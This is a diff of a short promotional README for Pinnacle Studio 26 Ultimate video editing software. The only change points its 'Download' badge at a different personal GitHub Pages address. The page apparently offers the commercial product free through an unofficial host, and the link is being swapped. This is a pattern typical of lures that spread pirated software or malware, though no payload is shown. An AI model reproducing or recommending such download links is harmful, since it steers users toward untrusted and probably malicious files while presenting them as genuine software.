@@ -2,7 +2,7 @@
 
 **Pinnacle Studio 26 Ultimate** is a professional-grade video editing software offering powerful tools, multi-camera editing, motion tracking, and 4K/HD support. It’s perfect for content creators, filmmakers, and YouTubers who need total creative control.
 
-[![⬇️ Download Pinnacle Studio 26 Ultimate](https://img.shields.io/badge/⬇️_Download_Pinnacle_Studio_26-blueviolet?style=for-the-badge&logo=corel)](https://pinnacle-studio-26-ultimate-download.github.io/.github)
+[![⬇️ Download Pinnacle Studio 26 Ultimate](https://img.shields.io/badge/⬇️_Download_Pinnacle_Studio_26-blueviolet?style=for-the-badge&logo=corel)](https://matookfj.github.io/.github/pinnaclestudio)
 
 ---
 
